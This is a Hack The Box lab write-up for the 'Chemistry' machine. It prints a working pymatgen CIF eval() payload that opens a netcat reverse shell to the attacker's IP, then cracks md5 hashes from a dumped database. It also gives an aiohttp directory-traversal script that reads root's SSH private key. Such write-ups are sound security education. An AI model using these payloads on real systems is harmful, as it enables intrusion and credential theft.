---
title: "Chemistry HackTheBox Write-up"
source_url: https://publish.obsidian.md/cn-0x-writeups/Hack+The+Box+Write+ups/Chemistry/Chemistry+HackTheBox+Write-up
fetched_at: 2026-09-20T07:24:55Z
license: unspecified
category: misc
---

## Summary of exploitation

Hey all! Today I Pwned Chemistry on Hack The Box. Chemistry was an easy box that involved exploiting an issue with the python library pymatgen. Pymatgen uses eval() for processing input and can be exploited when parsing a maliciously created CIF file. Chemistry is running a python web application that parses CIF files using the pymatgen library allowing us to get blind RCE. Once I had a shell I was able to dump the applications database which contained the local users ssh credentials. Once logged in as the local user, I was able to exploit a directory traversal vulnerability existing in a local hosts python (python AioHTTP library) web application allowing me to capture the root users ssh key.

## Recon Phase

As always, I begin with my tried and true nmap scan.

sudo nmap -sC -sV --min-rate 10000 -p- 10.129.194.94 -oA nmap.out

```
┌──(kali㉿kali)-[~/Documents/htb/chemestry/enu]
└─$ sudo nmap -sC -sV --min-rate 10000 -p- 10.129.194.94 -oA nmap.out
[sudo] password for kali:
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-21 15:39 EST
Nmap scan report for 10.129.194.94
Host is up (0.022s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p2 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 b6:fc:20:ae:9d:1d:45:1d:0b:ce:d9:d0:20:f2:6f:dc (RSA)
|   256 f1:ae:1c:3e:1d:ea:55:44:6c:2f:f2:56:8d:62:3c:2b (ECDSA)
|_  256 94:42:1b:78:f2:51:87:07:3e:97:26:c9:a2:5c:0a:26 (ED25519)
5000/tcp open  upnp?
| fingerprint-strings:
|   GetRequest:
|     HTTP/1.1 200 OK
|     Server: Werkzeug/3.0.3 Python/3.9.5
...
```

It comes back alittle nastier than usual because the webserver is running on port 5000 rather than a common http port.

| Port | Protocol | Service Details |
| 22 | SSH | OpenSSH 8.2p2 |
| 5000 | HTTP | Werkzeug 3.0.3 Python/3.9.5 |

etc/hosts

http://chemistry.htb:5000

We have 2 options here. We can either login or register. Since I'm just taking a look around. I'm going to click register.

Once I click "Register" I am redirected to a dashboard that allows for a CIF upload.

There is an example, Ill click it and download the example file and see what its looking for.

I don't know what this means or is. I am no chemistry expert nor do I want to be. I actually withdrew from chemistry after the first exam in high school. Got a big ol F.

I'm going to upload this example file to see what this web app does.

The file uploaded ok, Ill click View.

There it is, a CIF structure. cool. This is clearly using some sort of backend python library that accepts and parses cif data. I looked around a bit more and there wasn't anything of significance.

## Exploitation Phase

github exploit

ping -c 5 10.10.14.18

```
data_5yOhtAoR
_audit_creation_date            2018-06-08
_audit_creation_method          "Pymatgen CIF Parser Arbitrary Code Execution Exploit"

loop_
_parent_propagation_vector.id
_parent_propagation_vector.kxkykz
k1 [0 0 0]

_space_group_magn.transform_BNS_Pp_abc  'a,b,[d for d in ().__class__.__mro__[1].__getattribute__ ( *[().__class__.__mro__[1]]+["__sub" + "classes__"]) () if d.__name__ == "BuiltinImporter"][0].load_module ("os").system ("ping -c 5 10.10.14.18");0,0,0'

_space_group_magn.number_BNS  62.448
_space_group_magn.name_BNS  "P  n'  m  a'  "
```

tcpdump

sudo tcpdump -i tun0 icmp

Easy RCE, Lets update the cif file to a reverse shell one liner and get a shell on the machine.

Ill set up my listener

```
┌──(kali㉿kali)-[~/Documents/htb/chemestry/loot]
└─$ sudo nc -lvnp 443
listening on [any] [443] ...
```

And Ill change the payload to include my one liner ``

```
data_5yOhtAoR
_audit_creation_date            2018-06-08
_audit_creation_method          "Pymatgen CIF Parser Arbitrary Code Execution Exploit"

loop_
_parent_propagation_vector.id
_parent_propagation_vector.kxkykz
k1 [0 0 0]

_space_group_magn.transform_BNS_Pp_abc  'a,b,[d for d in ().__class__.__mro__[1].__getattribute__ ( *[().__class__.__mro__[1]]+["__sub" + "classes__"]) () if d.__name__ == "BuiltinImporter"][0].load_module ("os").system ("busybox nc 10.10.14.18 443 -e /bin/bash");0,0,0'

_space_group_magn.number_BNS  62.448
_space_group_magn.name_BNS  "P  n'  m  a'  "
```

And give it an upload again.

Nice, we got a shell as app! Im going to run my usual trick to get functional tty.

```
python3 -c 'import pty; pty.spawn("/bin/bash")'
Ctrl ^Z
stty raw -echo && fg
reset
screen
export TERM=xterm
clear
```

## Priv-Esc to rosa

I looked at the home directory and noticed there was another use named Rosa who has the user flag.

```
app@chemistry:/home$ ll
total 16
drwxr-xr-x 4 root root 4096 Jun 16  2024 ./
drwxr-xr-x 19 root root 4096 Oct 11 11:17 ../
drwxr-xr-x 8 app   app  4096 Oct  9 20:18 app/
drwxr-xr-x 5 rosa rosa  4096 Jun 17  2024 rosa/
```

I looked at the app users home directory contents and I can see that the web application is being ran from his home dir. Looking around, I found the database that potentially contains the registered users.

```
app@chemistry:~/instance$ ll
total 28
drwx------ 2 app  app  4096 Dec 21 22:00 ./
drwxr-xr-x 8 app   app  4096 Oct  9 20:18 ../
-rwx------ 1 app 20480 Dec 21 22:00 database.db*
```

strings

```
app@chemistry:~/instance$ strings database.db
SQLite format 3
ytableuseruser
CREATE TABLE user (
        id INTEGER NOT NULL,
        username VARCHAR(150) NOT NULL,
        password VARCHAR(150) NOT NULL,
        PRIMARY KEY (id),
        UNIQUE (username)
indexsqlite_autoindex_user_1user
5tablestructurestructure
...
```

This is great! I'm going to extract this database file by just copying it to the web application so I can download it.

app@chemistry:~/instance$ cp database.db ../static/database.db

http://chemistry.htb:5000/static/database.db

file / sqlite3 — SQLite 3 database with a `user` table of md5 password hashes (admin, app, rosa, robert, jobert, carlos, peter, victoria, tania, eusebio, gelacia, fabian, axel, kristel, cn-0x).

These are md5 hashes. I can break Rosa's using hashcat, first Ill throw the hash into a file. I could try and break all the hashes, I don't think it'll be necessary for this machine.

echo '63ed8***********************' > rosa.hash

We will set mode to 0 for md5 and use the rockyou.txt wordlist.

hashcat -m 0 rosa.hash /usr/share/wordlists/rockyou.txt

Ill use the cracked password to ssh as rosa

ssh rosa@10.129.194.94

And grab the user flag!

```
rosa@chemistry:~$ cat user.txt
513a2d************************
```

## Priv_Esc to root

sudo -l

```
rosa@chemistry:~$ sudo -l
[sudo] password for rosa:
Sorry, user rosa may not run sudo on chemistry.
```

Nothing here.

Now I usually check the /opt directory.

```
rosa@chemistry:~$ ll /opt
total 12
drwxr-xr-x 3 root root 4096 Jun 16  2024 ./
drwxr-xr-x 19 root root 4096 Oct 11 11:17 ../
drwxr-xr-x------ 5 root root 4096 Oct  9 20:27 monitoring_site/
```

ps -aux

netstat -ano

Unfortunately, Monitoring_site is owned by root and I cant access it. Ill need to look at it and enumerate it a bit to check it out. Ill need to upload chisel to proxy the port over to me.

Github

```
wget https://github.com/jpillora/chisel/releases/download/v1.10.1/chisel_1.10.1_linux_amd64.gz

gunzip chisel_1.10.1_linux_amd64.gz

mv chisel_1.10.1_linux_amd64 chisel

chmod +x chisel
```

Now Ill set up my python http server and serve it to the victim

```
ATTACKER:
┌──(kali㉿kali)-[~/Documents/htb/chemestry/payloads]
└─$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0/) ...
```

```
VICTIM:
rosa@chemistry:~$ wget http://10.10.14.18/chisel
rosa@chemistry:~$ chmod +x chisel
```

Now I need to run chisel so I can access the local port from the attacker

```
ATTACKER:
./chisel server -p 8000 --reverse
```

```
VICTIM:
./chisel client 10.10.14.18:8000 R:8080:127.0.0.1:8080
```

http://127.0.0.1:8080

Now I just need to do alittle recon. Ill start with a directory search using feroxbuster.

feroxbuster -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://127.0.0.1:8080

Nothing here but an asset folder. I'm going to take a look at the request headers using Burp Suite.

Interestingly, This is not a Werkzeug Python server, but an aiohttp server. I'm going to pop that into google and see what comes back.

This looks promising!

It looks like the exact version running on the server is vulnerable to a directory traversal attack. Ill take a look at the exploit script.

```
#!/bin/bash

url="http://localhost:8081"
string="../"
payload="/static/"
file="etc/passwd" # without the first /

for ((i=0; i<15; i++)); do
    payload+="$string"
    echo "[+] Testing with $payload$file"
    status_code=$(curl --path-as-is -s -o /dev/null -w "%{http_code}" "$url$payload$file")
    echo -e "\tStatus code --> $status_code"

    if [[ $status_code -eq 200 ]]; then
        curl -s --path-as-is "$url$payload$file"
        break
    fi
done
```

../ /static/ /assets/

```
#!/bin/bash

url="http://127.0.0.1:8080"
string="../"
payload="/assets/"
file="etc/passwd" # without the first /
```

Now Ill just give it a run!

root/.ssh/id_rsa

```
#!/bin/bash

url="http://127.0.0.1:8080"
string="../"
payload="/assets/"
file="root/.ssh/id_rsa" # without the first /
```

And run it again!

```
┌──(kali㉿kali)-[~/Documents/htb/chemestry/exploits]
└─$ ./exploit.sh
[+] Testing with /assets/../root/.ssh/id_rsa
        Status code --> 404
[+] Testing with /assets/../../root/.ssh/id_rsa
        Status code --> 404
[+] Testing with /assets/../../../root/.ssh/id_rsa
        Status code --> 200
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAE
...
```

You love to see it!

id_rsa

```
vi id_rsa
i <insert>
Ctrl V
:wq
chmod 600 id_rsa
ssh -i id_rsa root@10.129.194.94
```

And grab the root flag

```
root@chemistry:~# cat root.txt
2da4d**************************
```

## Conclusion

Thanks everyone for reading. I hope you learned something! I always do. Happy Hacking!
